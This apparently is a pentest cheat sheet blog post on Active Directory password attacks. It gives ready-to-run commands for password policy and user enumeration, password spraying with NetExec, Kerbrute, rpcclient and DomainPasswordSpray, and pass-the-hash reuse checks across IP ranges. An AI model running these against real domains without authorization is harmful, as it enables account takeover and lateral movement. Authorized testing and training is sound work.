---
title: Password Attacks
date: 2026-06-29 21:11:44

categories:
  - Active Directory
  - Exploitation
  - Password Attacks

tags:
  - Windows
  - Active-Directory
  - Password-Attacks
  - Password-Spraying
  - Password-Reuse
  - Credential-Reuse
  - NetExec
  - Kerbrute
  - rpcclient
  - LDAP
  - ldapsearch
  - enum4linux
  - windapsearch
  - PowerView
  - DomainPasswordSpray
  - Password-Policy
  - Lockout-Policy
  - User-Enumeration
  - Domain-Users

cover: /img/password-attacks.png
top_img: /img/bg-img.jpg
description: Learn how to enumerate domain password policies, discover valid users, perform password spraying, and identify credential reuse in Active Directory environments using Linux and Windows tools.
---


> ➜ Password attacks are one of the most common ways to obtain an initial domain credential. Before attempting any password spray, we should enumerate the domain password policy to avoid locking user accounts. Once the policy is known, we can build a list of valid usernames and perform a controlled password spray against the domain.

## Enumerating the Password Policy

> ➜ Before spraying passwords, identify the domain's password and account lockout policy, the most important values are the lockout threshold and lockout observation window, allowing us to stay below the lockout limit during the engagement.

### Linux 

> NetExec

```bash
nxc smb <DC_IP> -u <user> -p <pass> --pass-pol
```

> rpcclient 

```bash
rpcclient -U "" -N <DC_IP>

rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

> enum4linux-ng

```bash
enum4linux-ng -P <DC_IP> -oA report
```

### Windows

```powershell
net accounts
```

> Or

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

## Enumerating Domain Users

> ➜ After identifying the password policy, the next step is to build a list of valid domain users that will be used during the password spray.

### Linux

> NetExec

```bash
nxc smb <DC_IP> --users
```

> Kerbrute

```bash
kerbrute userenum -d <DOMAIN> --dc <DC_IP> userlist.txt
```

> LDAP

```bash
ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts
```

```bash
ldapsearch -h <DC_IP> -x -b "DC=<DOMAIN>,DC=LOCAL" "(&(objectClass=user))" | grep sAMAccountName
```

> windapsearch

```bash
windapsearch.py --dc-ip <DC_IP> -u "" -U
```

> rpcclient

```bash
rpcclient -U "" -N <DC_IP>

rpcclient $> enumdomusers
```

> enum4linux

```bash
enum4linux -U <DC_IP> | grep "user:"
```


## Password Spraying

### Linux

##### Password Spraying Against PASSWD_NOTREQD Accounts

> NetExec

```bash
nxc smb <DC_IP> -u valid_users.txt -p ""
```

##### Password Spraying with Username as the Password

> NetExec


```bash
nxc smb <DC_IP> -u valid_users.txt -p valid_users.txt --continue-on-success --no-bruteforce
```

##### Password Spraying with a Known Password

> NetExec

```bash
nxc smb <DC_IP> -u valid_users.txt -p Welcome1
```

> Kerbrute

```bash
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt Welcome1
```

> rpcclient

```bash
for u in $(cat valid_users.txt); do
    rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC_IP>
done
```

### Windows

> DomainPasswordSpray

```powershell
Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success
```

## Password Reuse

> ➜ Once valid credentials (or an NTLM hash) have been obtained, they can be tested against other hosts to identify additional systems where the same password has been reused.

### Local Account Reuse

```bash
nxc smb --local-auth IP-range -u administrator -H <NTLM_HASH>
```

> ➜ The `--local-auth` option authenticates using the target's local account database instead of the domain, making it useful for identifying reused local administrator passwords or NTLM hashes.

### Domain Account Reuse

```bash
nxc smb IP-range -u <DOMAIN_USER> -p <PASSWORD>
```

> Or using an NTLM hash:

```bash
nxc smb IP-range -u <DOMAIN_USER> -H <NTLM_HASH>
```

> ➜ Since domain accounts are centrally managed, successful authentication typically indicates that the account has access to multiple systems rather than password reuse between hosts.